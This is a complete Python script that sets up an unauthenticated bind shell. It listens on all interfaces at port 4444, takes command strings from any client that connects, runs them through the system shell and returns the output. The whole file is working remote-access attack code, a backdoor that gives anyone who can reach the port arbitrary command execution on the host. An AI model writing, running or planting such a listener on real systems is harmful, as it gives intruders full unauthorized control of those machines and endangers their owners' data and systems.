import socket
import subprocess
import threading

def handle_client(client_socket, address):
    print(f"[+] Connection received from {address}")
    client_socket.send(b"Connected to bind shell!\n")

    while True:
        client_socket.send(b"[bind-shell]$ ")
        try:
            command = client_socket.recv(1024).decode("utf-8").strip()
            if not command:
                break
            if command.lower() in ["exit", "quit"]:
                break

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "[+] Command executed, no output.\n"
            client_socket.send(output.encode())
        except Exception as e:
            client_socket.send(str(e).encode())
            break

    client_socket.close()
    print(f"[-] Disconnected from {address}")

def start_bind_shell(bind_ip="0.0.0.0", bind_port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print(f"[+] Bind shell listening on {bind_ip}:{bind_port}")

    while True:
        client, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client, addr))
        client_thread.start()

if __name__ == "__main__":
    start_bind_shell()
